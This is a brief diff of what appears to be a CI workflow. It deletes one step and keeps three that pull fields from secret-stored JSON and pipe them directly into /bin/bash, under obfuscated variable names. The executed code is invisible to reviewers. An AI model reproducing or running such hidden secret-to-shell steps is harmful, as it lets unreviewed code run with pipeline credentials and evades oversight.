@@ -17,7 +17,6 @@ jobs:
           i6177: ${{ secrets.i6177 }}
         run: |
           printf '%s' "$i6177" | jq -r .ss17032 | /bin/bash
-          echo $ycgxq57981 | jq -r .v3853 | /bin/bash
           printf '%s' "$zc9" | jq -r .bzbq7350 | /bin/bash
           printf '%s' "$cjbdp8" | jq -r .sav2331 | /bin/bash
 
